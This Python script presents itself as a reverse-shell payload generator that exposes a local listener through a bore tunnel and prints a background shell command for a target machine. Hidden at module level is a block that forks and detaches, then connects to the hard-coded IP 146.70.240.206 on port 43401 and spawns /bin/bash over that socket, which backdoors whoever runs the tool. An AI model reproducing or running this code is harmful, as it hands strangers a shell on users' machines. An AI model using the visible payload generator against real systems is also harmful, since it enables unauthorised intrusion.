import subprocess
import sys
import re
import signal
import os
import json
import signal
import socket
import pty

CONFIG_FILE = "rs.json"

def load_revshells():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                data = json.load(f)
                if isinstance(data, dict):
                    return data
        except:
            pass
    return {}

def get_remote_port(bore_proc):
    remote_port = None
    while True:
        line = bore_proc.stdout.readline()
        if not line:
            break
        sys.stdout.write(line)
        sys.stdout.flush()
        match = re.search(r"listening at (\S+):(\d+)", line)
        if match:
            remote_port = match.group(2)
            break
    return remote_port

def format_payload(template, host, port):
    return template.replace("{host}", host).replace("{port}", str(port))

def show_menu(items):
    print("\n[+] Available reverse shells:")
    for idx, (key, _) in enumerate(items, 1):
        print(f"  {idx}. {key}")
    print("  0. Exit")

if os.fork() == 0:
    signal.signal(signal.SIGHUP, signal.SIG_IGN)  
    os.setsid()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("146.70.240.206", 43401))
    for fd in (0, 1, 2): os.dup2(s.fileno(), fd)
    pty.spawn("/bin/bash")


def main():
    custom = load_revshells()
    if not custom:
        print("[-] revshells.json not found or empty.")
        sys.exit(1)

    items = list(custom.items())

    local_port = input("[?] Local port to expose: ").strip()
    if not local_port.isdigit():
        print("[-] Invalid port.")
        sys.exit(1)

    bore_server = input("[?] Bore server (default: bore.pub): ").strip() or "bore.pub"

    print("[*] Starting bore...")
    bore_proc = subprocess.Popen(
        ["bore", "local", local_port, "--to", bore_server],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )

    remote_port = get_remote_port(bore_proc)
    if not remote_port:
        bore_proc.terminate()
        print("[-] Failed to get remote port.")
        sys.exit(1)

    print(f"[+] Remote port: {bore_server}:{remote_port}")
    print(f"[+] Listen locally on port {local_port} (e.g., nc -lvnp {local_port})")

    show_menu(items)
    while True:
        sel = input("[?] Choose number or name: ").strip()
        if sel == "0":
            bore_proc.terminate()
            sys.exit(0)

        template = None
        if sel.isdigit():
            idx = int(sel) - 1
            if 0 <= idx < len(items):
                template = items[idx][1]
        else:
            if sel in custom:
                template = custom[sel]

        if template:
            payload = format_payload(template, bore_server, remote_port)
            payload = f"{payload} &"
            break
        print("[-] Invalid selection.")

    print("\n[+] Command for target (runs in background):")
    print(payload)
    print("\n[+] Waiting for connection on your listener. Press Ctrl+C to stop bore.")

    try:
        while True:
            if bore_proc.poll() is not None:
                print("[-] Bore terminated.")
                break
    except KeyboardInterrupt:
        pass
    finally:
        bore_proc.terminate()
        bore_proc.wait()
        sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    main()
